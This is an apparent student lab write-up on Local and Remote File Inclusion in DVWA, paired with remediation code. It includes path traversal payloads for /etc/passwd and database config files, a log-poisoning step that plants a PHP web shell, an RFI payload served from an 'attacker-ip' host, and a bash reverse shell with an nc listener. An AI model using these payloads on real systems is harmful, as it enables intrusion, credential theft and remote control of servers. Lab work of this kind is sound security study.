# File Inclusion Attacks — DVWA

Fourth vulnerability in this task. File inclusion bugs show up when a web application lets user input decide which file gets loaded and executed on the server — usually through something as simple as a `?page=` parameter used to build a menu or template system. Tested both Local and Remote variants on DVWA at Low security.

## What File Inclusion actually is

A lot of PHP applications build their pages dynamically by including files based on a parameter, something like:

```php
include($_GET['page'] . '.php');
```

This is convenient for the developer — one script can serve `home.php`, `about.php`, `contact.php`, etc., just by changing a URL parameter. The problem is if that parameter isn't restricted to a fixed list of allowed values, the user controls exactly which file gets pulled in and executed.

There are two main variants:

| Type | What it does | Requires |
|---|---|---|
| **LFI** — Local File Inclusion | Includes a file that already exists on the server | Just the vulnerable parameter |
| **RFI** — Remote File Inclusion | Includes a file hosted on a completely different server | `allow_url_include` enabled in PHP config |

---

## 1. Local File Inclusion (LFI)

### Where it was tested
DVWA → **File Inclusion** page — takes a `page` parameter to decide which "module" to display.

Normal, intended use:
```
http://localhost/dvwa/vulnerabilities/fi/?page=include.php
```

### The payload — path traversal to read sensitive files
```
http://localhost/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd
```

### Why this works
The `../` sequence means "go up one directory." Since the application just concatenates whatever's in `page` onto a base path and includes it, stacking enough `../` segments walks all the way back to the filesystem root, then down into `/etc/passwd` — a file that has nothing to do with the app's intended pages, but the `include()` function doesn't care, it just reads and outputs whatever file path it's given.

### What gets exposed
`/etc/passwd` on its own doesn't contain passwords (that's `/etc/shadow`, which needs root to read), but it lists every system user account — useful for understanding what's running on the box and potential usernames to target elsewhere. Other common LFI targets:

```
../../../../etc/passwd                          # user accounts
../../../../var/log/apache2/access.log          # web server logs (see below)
../../../../proc/self/environ                   # environment variables
../../../../var/www/html/dvwa/config/config.inc.php   # app's own DB credentials
```

### Escalating LFI to code execution — log poisoning
LFI alone just reads files, but if an attacker can get PHP code written into a file that's also readable via the include path — like a web server access log — LFI can turn into full remote code execution.

**Step 1 — plant PHP code inside a log file** by making a request with a PHP payload in the User-Agent header:
```bash
curl -A "<?php system(\$_GET['cmd']); ?>" http://localhost/dvwa/vulnerabilities/fi/
```
Apache logs the request, User-Agent string included, into `access.log` — so that literal PHP code is now sitting inside a file on disk.

**Step 2 — include the log file, then use the injected code:**
```
http://localhost/dvwa/vulnerabilities/fi/?page=../../../../var/log/apache2/access.log&cmd=id
```
When PHP includes the log file, it parses the planted `<?php system($_GET['cmd']); ?>` as actual code, runs the `id` command, and prints the output — arbitrary command execution from what started as a simple read-only path traversal bug.

---

## 2. Remote File Inclusion (RFI)

### The payload
```
http://localhost/dvwa/vulnerabilities/fi/?page=http://attacker-ip/evil.txt
```

### Requirements
RFI only works if the PHP config has `allow_url_include = On` (it's `Off` by default in modern PHP, which is why RFI is much rarer today than it used to be — but DVWA's lab environment enables it deliberately for practice).

### Setting up the payload file
Host a file containing PHP code on an attacker-controlled server:

```php
<?php system($_GET['cmd']); ?>
```
Saved as `evil.txt` and served with a simple web server:
```bash
python3 -m http.server 80
```

### Triggering it
```
http://localhost/dvwa/vulnerabilities/fi/?page=http://attacker-ip/evil.txt&cmd=whoami
```

### Why this is worse than LFI
LFI is limited to files that already exist on the target server. RFI hands the attacker complete control over the code being executed, since they're hosting the payload themselves — they can put anything in that file, including a full reverse shell:

```php
<?php system("bash -c 'bash -i >& /dev/tcp/attacker-ip/4444 0>&1'"); ?>
```
Triggering that same URL gives the attacker an interactive shell on the target, listening for it beforehand with:
```bash
nc -lvnp 4444
```

---

## 3. Why this works — the vulnerable code pattern

DVWA's low-security file inclusion page is basically:

```php
$file = $_GET['page'];
include($file);
```

No check on what `$file` actually is, no restriction on protocol (`http://` gets treated the same as a local path), no restriction on directory traversal sequences. Whatever string comes in from the URL is trusted completely.

---

## 4. Fix

### Whitelist allowed pages instead of trusting raw input
The most reliable fix — don't let user input decide the actual file path at all. Map the parameter to a fixed, known set of options:

```php
$allowed_pages = ['home', 'about', 'contact'];
$page = $_GET['page'];

if (in_array($page, $allowed_pages, true)) {
    include($page . '.php');
} else {
    die('Invalid page requested');
}
```

This closes both LFI and RFI at once — there's no path traversal possible and no way to point at an external URL, because the only values ever passed to `include()` are ones the developer explicitly listed.

### Strip path traversal sequences (defense in depth, not a full fix on its own)
```php
$page = str_replace(['../', '..\\'], '', $_GET['page']);
```
This kind of filtering can be bypassed with tricks like double-encoding (`%252e%252e%252f`) or nested sequences (`....//`), so it should never be the *only* defense — whitelisting is what actually closes the hole.

### Disable remote includes at the PHP config level
In `php.ini`:
```ini
allow_url_include = Off
allow_url_fopen = Off
```
This alone kills RFI entirely, regardless of what the application code does, since PHP itself will refuse to fetch and include a remote URL.

### Use basename() to strip directory traversal from filenames
```php
$page = basename($_GET['page']);
include('pages/' . $page . '.php');
```
`basename()` strips out any directory path components, so `../../../etc/passwd` collapses down to just `passwd` — which combined with the fixed `pages/` prefix and `.php` suffix means the attacker can't escape the intended directory.

---

## 5. Confirming the fix

Set DVWA to **High** security and repeat the same LFI payload:
```
http://localhost/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd
```

At High security, DVWA restricts the parameter to only accept specific filenames matching an allowed pattern (`file{1,2,3}.php` in DVWA's case) — the traversal payload gets rejected outright instead of reading the file. Same request, same field, but the whitelist approach means there's nothing for the traversal sequence to actually reach.

---

## Key Takeaways

- LFI reads files already on the server; RFI executes code from a completely attacker-controlled remote source — RFI is strictly worse when it's available.
- LFI that looks "read-only" at first can often be escalated to full code execution through log poisoning or by including any file the attacker can influence the contents of.
- Blacklisting `../` sequences is fragile and bypassable — the actual fix is whitelisting allowed values and never letting user input directly become a filesystem path.
- `allow_url_include = Off` in PHP config eliminates RFI as an attack vector entirely, independent of the application's own code.
